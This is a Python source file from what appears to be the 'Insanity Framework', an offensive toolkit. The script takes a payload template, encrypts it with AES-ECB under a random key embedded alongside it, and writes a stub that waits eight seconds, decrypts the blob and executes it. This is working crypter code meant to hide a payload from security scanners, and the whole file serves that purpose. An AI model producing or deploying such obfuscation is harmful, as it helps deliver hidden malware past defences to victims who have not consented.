#!/usr/bin/env python
# Copyright 2017 Insanity Framework (IF)
# Written by: * Alisson Moretto - 4w4k3
#             * Thomas Perkins  - Ekultek
# https://github.com/4w4k3/Insanity-Framework
# Licensed under the BSD-3-Clause
from Crypto.Cipher import AES
from base64 import b64encode
import string
import random


KEY_LENGTH = 32
RANDOM_STRING_PAYLOAD = ''.join(random.sample((string.ascii_uppercase + string.digits), KEY_LENGTH))
PAD = '@'


def create_b64_key(bit, chave):
    """ Create a base64 encoded 32 bit AES key """
    extra = (KEY_LENGTH - len(bit)) % KEY_LENGTH
    aes_key = AES.new(chave, AES.MODE_ECB)
    crypt = aes_key.encrypt(bit + PAD * extra)
    return b64encode(crypt)  # Return a base64 encoded AES key


def create_payload_script(path, output, chave):
    """ Create the payload script that will be located in Templates/insane_enc.py """
    vm_template = open(path, 'a+').read()
    b64_encoded_AES_key = create_b64_key(vm_template, chave)
    payload = "from Crypto.Cipher import AES\n"  # Create the payload
    payload += "from base64 import b64decode\n"
    payload += "from time import sleep\n"
    payload += "\n\nsleep(8)\n"
    payload += "aes = AES.new('{}', AES.MODE_ECB)\n".format(chave)
    payload += "exec(aes.decrypt(b64decode('{}')).rstrip('{}'))".format(b64_encoded_AES_key, PAD)
    insane_enc_template = open(output, 'a+')
    try:
        insane_enc_template.write(payload)
        insane_enc_template.close()
    except Exception as e:
        raise IndexError("Failed to create insane_enc.py with error: {}".format(e))


def main():
    """ Main function that calls all the rest """
    insanity_template_one = 'Templates/Insane.py'
    insanity_template_two = 'Templates/insane_enc.py'
    create_payload_script(
        insanity_template_one,
        insanity_template_two,
        RANDOM_STRING_PAYLOAD
    )


if __name__ == '__main__':
    main()
